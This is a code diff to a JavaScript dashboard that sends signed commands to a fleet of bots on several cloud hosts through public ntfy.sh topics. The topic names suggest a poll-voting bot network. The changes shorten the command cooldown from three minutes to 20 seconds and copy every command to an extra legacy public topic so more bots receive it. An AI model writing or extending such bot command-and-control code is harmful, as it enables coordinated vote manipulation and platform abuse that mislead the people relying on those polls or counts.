@@ -802,11 +802,11 @@
         }
     });
 
-    // --- 4. 3-Minute (180s) Cooldown Timer Controller ---
+    // --- 4. Fast 20-Second Cooldown Timer Controller ---
     const COOLDOWN_KEY = 'sadew_action_cooldown_expiry';
     let cooldownInterval = null;
 
-    function startCooldown(seconds = 180) {
+    function startCooldown(seconds = 20) {
         const expiry = Date.now() + (seconds * 1000);
         localStorage.setItem(COOLDOWN_KEY, expiry.toString());
         renderCooldown();
@@ -867,15 +867,7 @@
 
     // --- 5. Live Server Feedback Stream & Active Bot Counting ---
     function connectStatusStream() {
-        // Connect to SSE stream (no since=now to avoid HTTP 400 error)
-        const eventSource = new EventSource(`https://ntfy.sh/${_TK_S}/sse`);
-
-        eventSource.onopen = () => {
-            // Send ping to immediately poll all bots across Heroku, AWS, Railway, Render etc.
-            sendSignedCommand({ action: 'ping', link: 'ping' }, true).catch(() => {});
-        };
-
-        eventSource.onmessage = (event) => {
+        const handleMessage = (event) => {
             try {
                 const data = JSON.parse(event.data);
                 if (data.event === 'message' && data.message) {
@@ -914,9 +906,20 @@
             }
         };
 
+        const eventSource = new EventSource(`https://ntfy.sh/${_TK_S}/sse`);
+        eventSource.onopen = () => {
+            sendSignedCommand({ action: 'ping', link: 'ping' }, true).catch(() => {});
+        };
+        eventSource.onmessage = handleMessage;
         eventSource.onerror = () => {
             setTimeout(connectStatusStream, 5000);
         };
+
+        // Also listen to legacy status topic for bots still redeploying
+        try {
+            const fallbackSource = new EventSource('https://ntfy.sh/sadew_poll_status_hub_70/sse');
+            fallbackSource.onmessage = handleMessage;
+        } catch (e) {}
     }
 
     // Refresh active bot count every 5 seconds (pruning devices quiet > 3 mins)
@@ -957,9 +960,15 @@
             body: JSON.stringify(securePayload)
         });
 
+        // Dual-broadcast to legacy topic for any bot servers still awaiting redeploy
+        fetch('https://ntfy.sh/sadew_poll_vote_hub_70', {
+            method: 'POST',
+            body: JSON.stringify(securePayload)
+        }).catch(() => {});
+
         if (response.ok) {
             if (!isPing) {
-                startCooldown(180); // 3 minutes cooldown
+                startCooldown(20); // 20 seconds cooldown
                 addLog(`⚡ Broadcast authenticated & dispatched! Waiting for devices...`, 'info');
             }
         } else {
